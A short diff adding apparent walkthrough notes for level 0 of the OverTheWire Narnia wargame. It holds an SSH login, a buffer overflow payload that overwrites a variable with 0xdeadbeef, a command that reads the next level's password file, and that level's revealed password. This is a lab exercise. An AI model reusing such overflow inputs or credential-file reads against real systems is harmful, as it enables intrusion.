@@ -1,0 +1,8 @@
+narnia0:narnia0
+echo -ne '12345678901234567890\xef\xbe\xad\xde' | tmux loadb -
+tmux
+ssh narnia0@narnia.labs.overthewire.org
+/narnia/narnia0
+ctrl-b ]   # (to paste)
+cat /etc/narnia_pass/narnia1
+narnia1:efeidiedae
